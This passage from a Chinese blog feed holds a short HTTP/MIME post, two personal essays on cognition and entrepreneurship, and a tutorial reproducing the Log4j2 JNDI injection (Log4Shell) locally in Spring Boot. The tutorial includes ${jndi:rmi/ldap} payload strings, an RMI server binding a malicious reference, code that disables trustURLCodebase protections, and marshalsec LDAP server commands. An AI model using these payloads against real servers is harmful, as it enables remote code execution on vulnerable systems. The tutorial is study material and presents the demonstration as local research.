来处理数据内容。</li><li>具体Mime类型对应的文件扩展名可以参考，<a href="https://www.w3school.com.cn/media/media_mimeref.asp">MIME参考手册 - w3school</a></li></ul></li></ul><p><br/></p><p>🥝文件上传下载的Content-Type与MIME</p><ul><li>文件上传<ul><li>例：<code>Content-Type: multipart/form-data</code></li><li>基于<strong>post</strong>请求的请求体来传递数据，请求体的编码为二进制</li><li>另外，该格式会生成一个<code>boundary</code>字符串来分割请求头与请求体的，具体的是以一个<code>boundary=$&#123;boundary&#125;</code>来进行分割</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/文件上传.png" alt="文件上传"></li></ul></li></ul><ul><li>文件下载<ul><li>例：<code>Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</code></li><li>一般使用GET请求就能获取指定资源，再通过MIME来翻译请求体的文件扩展名，例：以附件的形式下载照片文件</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/文件下载.png" alt="文件下载"></li></ul></li></ul><p><br/></p><p>🥝前后端分离项目常见的的Content-Type与MIME</p><ul><li>…</li></ul><p>🥝传统项目常见的Content-Type与MIME</p><ul><li>…</li></ul><p><br/></p><h3 id="📚参考文档"><a href="#📚参考文档" class="headerlink" title="📚参考文档"></a>📚参考文档</h3><ul><li><a href="https://baike.baidu.com/item/HTTP/243074?fromtitle=HTTP%E5%8D%8F%E8%AE%AE&amp;fromid=1276942&amp;fr=aladdin#3">HTTP协议 - 百度百科</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/08/http.html">互联网协议入门（一）- 阮一峰</a></li><li><a href="https://www.cnblogs.com/fnng/p/14783322.html">HTTP2.0 - 虫师</a></li><li><a href="https://zhuanlan.zhihu.com/p/452221091">深入理解HTTP协议 - 啊谢</a></li><li>网络协议：<span id="wlxy"><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/网络协议.jpg" alt="网络协议"></span></li><li>Restful：<span id="Restful"><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/Restful.png" alt="Restful"></span></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐概述&quot;&gt;&lt;a href=&quot;#⭐概述&quot; class=&quot;headerlink&quot; title=&quot;⭐概述&quot;&gt;&lt;/a&gt;⭐概述&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;全称&lt;/code&gt;：超文本传输协议（Hyper Text Transfer Protocol）&lt;/li&gt;
&lt;</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="各种协议" scheme="https://baicai.icu/tags/%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>什么是人们常说的认知</title>
    <link href="https://baicai.icu/posts/ee11ede9.html"/>
    <id>https://baicai.icu/posts/ee11ede9.html</id>
    <published>2022-02-20T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="🥝什么是认知"><a href="#🥝什么是认知" class="headerlink" title="🥝什么是认知"></a>🥝什么是认知</h4><p><img src="http://pic.baicai.icu/浅析人们常说的认知.assets/1.jpg" alt="1" style="zoom:50%;" /></p><p>我认为所谓的认知，就是对信息的处理。<code>处理</code>按照计算机的逻辑来说就是读和写。</p><p><code>读</code>，就是对原有数据进行提取，具体点来说，一本书一个画册一部电影一个音乐等等，就是现实已经存在的一些信息，然后每个人来通过自身的<code>读</code>从其中获取的信息，人与人之间的生物体差距造成了每个人获取信息的速度不同。再来说<code>写</code>，就是对自己掌握的信息以一些特点的方式进行输出，例如书本、画册、电影、音乐等等。</p><p>认知除了天赋异禀的，如贫穷家庭出了状元这种，就是出生自带强大的<code>读写</code>。其次大部分是来源于家庭和教育，古语有说龙生龙风生风。    </p><p>其次，阶级的不同，造成了信息源的不同。所以即使有钱人的孩子不聪明也可以通过喂给他最新的信息，再结合请到一些相关领域人士作为老师来教授信息的处理方式，这样的人是就掌握了最前沿的信息和信息处理的方法，即便处理的方法非常死板也是普通人需要花上一定时间才能获取到的。</p><p>而平民老百姓与之区别的是，一是家族里读大学都没几个，意味着大学之后的信息都需要自己亲身去尝试，二是即使有了信息也没有原始积累，所以读书获取老祖宗的思想，毕竟世界怎么变始终都离不开人，人之变书里面都说一千道一万了。或者上学来获取前沿的信息和信息处理的方法，其中包括导师和周围同学等等信息源和信息的处理方式。无论是书或者上学这两种都是获取平民获取信息最好最便宜的办法。</p><p>以上最直接的一个佐证就是计算机的软件行业。最近十多年计算机应用大多数都是以开源软件为主，这就意味着信息源不再封闭，最前沿的信息完全暴露在互联网，所以只要你是个<code>读</code>和<code>写</code>非常厉害的人，你就能获取到非常高的收入。</p><h4 id="🥝提升认知"><a href="#🥝提升认知" class="headerlink" title="🥝提升认知"></a>🥝提升认知</h4><p><img src="http://pic.baicai.icu/浅析人们常说的认知.assets/2.jpeg" alt="2" style="zoom:50%;" /></p><p>读和写的过程也有细分，如读的方法就决定从文件中获取信息的速度和深度，而老师教的正是读的方法，研究生这个阶段貌似就不能再教授读的方法了。比如从1+…100，如果天资聪慧的人，教了加法他就会乘法，教了7个音符他就会创一个谱，教他写字他就会写诗，这部分人天生就对一些数据格式敏感，可能是这些人的脑结构容易发现前人所发明的东西。一般人教乘法就知道乘法，所以书承载了思想和读的方法</p><p>认知可以提升吗？</p><p>我认为可以。比如一个人从不懂英语到能写英语作文，而且是在指定时间内的书写一定程度作文，一个佐证例子就是高三。</p><p>认知就跟cpu一样，从不会到会说明了读取信息的速度变快了，反过来是就是认知提升了。所以从小学到高中，人的脑部发育才会接近成熟，也许18岁以后不会再有因为生理原因造成的认知差距。</p><p>越有钱，就能买得到越接近人类最顶端的读的方法，而这些方法，有的是不公开的，或者说是最顶级的教授的一些生活习惯工作和工作习惯，这些不会发表在论文上，但是就是因为这些习惯<strong><font color="#ef7050">「特定的行为方式」</font></strong>造成了读的速度和读的范围的不同。</p><p>认知的提升，我认为还有一项可以提升，就是运动。从35岁就是坟场这个说法，人的读写能力随着年龄的增加可能存在降低的风险，只是可能，我不确定那些已经年近半百的院士是否有这个体会，根据网上的信息来说，35以后学习的能力确实下降了。而运动能让身体的机能增强，从而延迟35岁来让人的学习能力保持在一个比较良好的水平，这样就能提升读的能力，最后达到认知的提升，最好一个佐证就是程序员加完班再去锻炼，这个虽然不好，但是锻炼真能提升机能，只不过需要注意锻炼时看身体的承受能力。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;🥝什么是认知&quot;&gt;&lt;a href=&quot;#🥝什么是认知&quot; class=&quot;headerlink&quot; title=&quot;🥝什么是认知&quot;&gt;&lt;/a&gt;🥝什么是认知&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://pic.baicai.icu/浅析人们常说的认知.assets/1</summary>
      
    
    
    
    <category term="生活" scheme="https://baicai.icu/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="想到啥写啥" scheme="https://baicai.icu/tags/%E6%83%B3%E5%88%B0%E5%95%A5%E5%86%99%E5%95%A5/"/>
    
  </entry>
  
  <entry>
    <title>关于学习与创业的一些思考</title>
    <link href="https://baicai.icu/posts/9ed38cc4.html"/>
    <id>https://baicai.icu/posts/9ed38cc4.html</id>
    <published>2022-01-20T18:39:56.000Z</published>
    <updated>2022-12-06T19:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="🥝不要盲目的去学习"><a href="#🥝不要盲目的去学习" class="headerlink" title="🥝不要盲目的去学习"></a>🥝不要盲目的去学习</h4><ul><li>这个我有同感。就像我想去了解一个新事物，我会先收集资料，对新事物有个基本的画像后，再抠出自己对新事物的一个需求。接着是搜集资料，再筛选收集的资料<strong><font color="#ef7050">「如何筛选也基于自己的判断」</font></strong>，最后把剩余的资料和自身的经历结合去学习新事物，而不是一味的认同。</li></ul><p><br/></p><ul><li>假设遇到超越自己的知识或者理论，我不会立即接受，而是放到到一个池子里面，这个池子是一些等待验证的理论或者知识。那么这些理论或者知识什么时候才能接受呢？现在我的方法论是，当他反复出现多次的时候，我认为它是常见的，是属于一种普遍性的东西。但是需要注意的是，现在所有的app都有用户画像，如果仅仅基于新媒体这一信息渠道来判断池子中某一个理论是常见，是不行的。</li></ul><p><br/></p><ul><li>总的来说，我认为网上的信息和身边的信息，是37开，而且网上的信息还得是经过筛选的那种<strong><font color="#ef7050">「如朋友圈也有假信息」</font></strong>。这年头获取信息并不难，难的是信息的准确性和信息的源头。</li></ul><p><br/></p><ul><li>还有的是，接受新事物不难，难的是体会。人教人教不会，事教人一次就会，甚至还得在同一件事上吃几次亏才有所体会。所以是基于体会来接受新事物，还是基于普遍性来接受新事物，我还没有想好。或者说在认知和池子中间，再加一个缓存池【即具有普遍性的事物但是没有体会】，这样一来就增加了难度<strong><font color="#ef7050">「去体会的各种成本，还有新事物两次筛选机制」</font></strong>，我是倾向于再建立一个缓存池。俗话说的好，读万卷书不如行万里路，而普遍性也不是完全契合自己自身经历，甚至普遍性跟自身有出入的时候，如果根据普遍性去接受新事物是不合适的。</li></ul><p><br/></p><h4 id="🥝关于创业"><a href="#🥝关于创业" class="headerlink" title="🥝关于创业"></a>🥝关于创业</h4><ul><li><p>创业的本质是满足需求。而需求不是创业者提出的，而由市场和政策共同作用的。所以需要大量的信息<strong><font color="#ef7050">「如果可以在这个大量的信息中已经做好了初次筛选」</font></strong>，再从信息中察觉到新需求，所以这个察觉基于自身来完成。</p></li><li><p>总的来说，两方面，一个是信息源，一个是有经商的意识。</p></li></ul><p><br/></p><h4 id="🥝小结"><a href="#🥝小结" class="headerlink" title="🥝小结"></a>🥝小结</h4><ul><li>每个人每个阶段的认知可能会有变化，所以一成不变的思维才是最可能怕的。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;🥝不要盲目的去学习&quot;&gt;&lt;a href=&quot;#🥝不要盲目的去学习&quot; class=&quot;headerlink&quot; title=&quot;🥝不要盲目的去学习&quot;&gt;&lt;/a&gt;🥝不要盲目的去学习&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;这个我有同感。就像我想去了解一个新事物，我会先收集资料，对新事物</summary>
      
    
    
    
    <category term="生活" scheme="https://baicai.icu/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="事教人一次就会" scheme="https://baicai.icu/tags/%E4%BA%8B%E6%95%99%E4%BA%BA%E4%B8%80%E6%AC%A1%E5%B0%B1%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>springboot复现JNDI注入log4j2过程</title>
    <link href="https://baicai.icu/posts/cd49022.html"/>
    <id>https://baicai.icu/posts/cd49022.html</id>
    <published>2022-01-06T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐前提说明"><a href="#⭐前提说明" class="headerlink" title="⭐前提说明"></a>⭐前提说明</h3><ul><li>最近Apache Log4j被爆出有JNDI注入的漏洞，网上已经有非常详细的解释了，咱们也跟风一次，复现一下过程。</li><li><strong><font color="#ef7050">「本地演示全部在本地进行，文章内容仅限于学习研究之用，不要用于非法用途，不传播。」</font></strong></li></ul><p><br/></p><h3 id="⭐什么是JNDI"><a href="#⭐什么是JNDI" class="headerlink" title="⭐什么是JNDI"></a>⭐什么是JNDI</h3><ul><li>JNDI，全名：Java Name Directory Interface，SUN公司提供的一种标准的Java命名系统接口</li><li>JNDI主要有两部分组成：应用程序编程接口<strong>（API）</strong>和服务供应商接口<strong>（SPI）</strong>。<ul><li>应用程序编程接口：提供了Java应用程序<strong>访问</strong>各种命名和<strong>目录服务</strong>的功能</li><li>服务供应商接口：提供了任意一种服务的供应商使用的功能。</li></ul></li><li>通俗点来说，sun公司定义了规范<strong>(即JNDI)</strong>，服务提供商通过JNDI规范创造服务，开发人员通过服务商提供的服务和JNDI规范创造应用。如果没有同一个标准，不同的服务商与开发人员，有着各种各样的标准，这学习成本，光记忆不同标准就需要花非常多时间，所以JNDI是非常必要的。</li><li>如果哪里写得错了，可以留言告诉我！</li></ul><p><br/></p><h3 id="⭐其他服务"><a href="#⭐其他服务" class="headerlink" title="⭐其他服务"></a>⭐其他服务</h3><ul><li>RMI（JAVA远程方法调用）</li><li>LDAP（轻量级目录访问协议）</li><li>CORBA（公共对象请求代理体系结构）</li><li>DNS（域名服务）</li></ul><p><br/></p><h3 id="⭐JNDI和不同服务"><a href="#⭐JNDI和不同服务" class="headerlink" title="⭐JNDI和不同服务"></a>⭐JNDI和不同服务</h3><ul><li>JNDI的存在其实是为了协同其他应用来进行远程服务，它可以在客户端和服务端中都进行一些工作，其目的是为了将应用统一管理。</li><li>所以log4j漏洞就是通过其他服务注入到本地服务的JNDI</li></ul><p><br/></p><h3 id="⭐log4J漏洞执行流程"><a href="#⭐log4J漏洞执行流程" class="headerlink" title="⭐log4J漏洞执行流程"></a>⭐log4J漏洞执行流程</h3><ul><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/log4j原理.png" alt="log4j原理"></li></ul><p><br/></p><h3 id="⭐创建springboot工程"><a href="#⭐创建springboot工程" class="headerlink" title="⭐创建springboot工程"></a>⭐创建springboot工程</h3><ul><li><p>导入依赖，springboot好像默认使用slf4j+logback的方式来记录日志。所以需要去掉默认设置    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入springboot，去掉默认日志--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--加入log4j--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><br/></p><h3 id="⭐JNDI与RMI复现log4j漏洞"><a href="#⭐JNDI与RMI复现log4j漏洞" class="headerlink" title="⭐JNDI与RMI复现log4j漏洞"></a>⭐JNDI与RMI复现log4j漏洞</h3><ul><li><p>启动一个JNDI服务并绑定一个恶意类。</p><blockquote><p>恶意类实现不提供了，大体上是让本地服务弹出计算器</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//启动一个JNDI服务</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个恶意资源，注意参数className，factory的前缀，前缀代表了包的结构</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;***&quot;</span>, <span class="string">&quot;***&quot;</span>, <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给资源命名，并绑定</span></span><br><span class="line">        registry.bind(<span class="string">&quot;remote&quot;</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;攻击资源已经绑定到JNDI...&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义一个Restful风格的方法，方法中创建log4j对象并调用记录日志的方法，其实是模拟了服务器记录平常的日志信息。❗注意：高本版JDK默认不允许从远程的Codebase加载Reference工厂类，需要手动开启。    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/Rmi&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rmi</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Rmi.class);</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;记录登录日志&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//JNDI注入，模拟用户恶意请求</span></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:rmi://你的IP/remote&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>log4j执行原理网上有很多分析了，大概原理如下    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Jndi</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//log4j包含了这个执行顺序，所有只需要修改lookup的uri参数就能注入JNDI</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://你的IP/remote&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lookup</span> <span class="operator">=</span> ctx.lookup(uri);</span><br><span class="line">        System.out.println(lookup);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>启动springboot并调用对应的方法，效果如下</p><ul><li>可以看到请求的是本地服务，然后本地服务执行的代码应该是记录日志才对，但是却执行了远端的代码，而远端代码成功让本地服务弹出了电脑的计算器。</li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/log4j原理gif.gif" alt="log4j原理gif"></li></ul></li></ul><p><br/></p><h3 id="⭐JNDI与LDAP复现log4j漏洞"><a href="#⭐JNDI与LDAP复现log4j漏洞" class="headerlink" title="⭐JNDI与LDAP复现log4j漏洞"></a>⭐JNDI与LDAP复现log4j漏洞</h3><ul><li>还是老样子，在本地构建一个远端服务，该服务包含了ldap协议。</li></ul><p><br/></p><h4 id="🥝从github下工具包"><a href="#🥝从github下工具包" class="headerlink" title="🥝从github下工具包"></a>🥝从github下工具包</h4><ul><li>随便找个文件夹克隆git仓库<ul><li><code>git clone git@github.com:mbechler/marshalsec.git</code></li></ul></li><li>保持路径不变，使用命令打开文件夹<ul><li><code>cd marshalsec</code></li></ul></li><li>进入文件夹后，使用maven命令打包，前提是电脑已经安装与配置过maven工具<ul><li><code>mvn clean package -DskipTests</code></li></ul></li><li>打包成功后，在文件夹中找到以下两个压缩包，后面需要这两个jar包创建一个包含ldap的服务<ul><li><code>marshalsec-0.0.3-SNAPSHOT</code></li><li><code>marshalsec-0.0.3-SNAPSHOT-all</code></li></ul></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/获取ldap驱动包.png" alt="获取ldap驱动包"></li></ul><p><br/></p><h4 id="🥝创建ldap服务"><a href="#🥝创建ldap服务" class="headerlink" title="🥝创建ldap服务"></a>🥝创建ldap服务</h4><ul><li>复制上面两个jar包到idea工程的随便一个文件夹</li><li><p>在该文件夹下创建一个恶意类</p><ul><li>❗注意：不能包含包名，不能有中文，不能直接别的地方复制（必须手写，好像idea也不允许复制class文件）</li></ul></li><li><p>从终端打开该文件夹，编写最初的javac命令，将恶意类编译成class文件</p><ul><li><code>javac Attack.java</code></li></ul></li><li>使用命令创建ldap服务并绑定恶意类<ul><li>注意：有的终端命令打印可能没有<code>#</code>号，执行的命令中必须包含<code>#</code>号</li><li><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:1389/#Attack&quot;</code></li></ul></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/创建ldap服务绑定攻击类.png" alt="创建ldap服务绑定攻击类"></li></ul><p><br/></p><h4 id="🥝启动springboot并访问"><a href="#🥝启动springboot并访问" class="headerlink" title="🥝启动springboot并访问"></a>🥝启动springboot并访问</h4><ul><li><p>与上面一样，创建并启动一个springboot，能用浏览器访问到log4j对象中记录日志的方法即可<strong>（也需要开启允许从远程的Codebase加载Reference工厂类）</strong>。     </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/LDAP&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LDAP.class);</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.Ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;params:&#123;&#125;&quot;</span>,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/Attack&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看到与上面一样，访问的还是本地的服务，本地服务也应该记录日志才对，但是一样执行了远端的代码，而远端代码同样成功让本地服务弹出了电脑的计算器</p><ul><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/ldap.gif" alt="ldap"></li></ul></li></ul><p><br/></p><h3 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h3><ul><li>其实这个漏洞其实非常危险的，因为它能让服务器执行任意代码，而我们现实中很多东西实际上在服务器不就是一堆数据而已嘛</li><li>不过大厂都有安全顾问，也有非常多的安全措施</li><li>现在网络上已经有很多解决方案了，而且也有很多人在修复问题了</li><li>最后<strong>网络不是法外之地</strong></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/网络不是法外之地.jpg" alt="网络不是法外之地"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐前提说明&quot;&gt;&lt;a href=&quot;#⭐前提说明&quot; class=&quot;headerlink&quot; title=&quot;⭐前提说明&quot;&gt;&lt;/a&gt;⭐前提说明&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;最近Apache Log4j被爆出有JNDI注入的漏洞，网上已经有非常详细的解释了，咱们也跟风一次，复现</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Spring全家桶" scheme="https://baicai.icu/tags/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    <category term="编程热点" scheme="https://baicai.icu/tags/%E7%BC%96%E7%A8%8B%E7%83%AD%E7%82%B9/"/>
    
  </entry>
  
</feed>
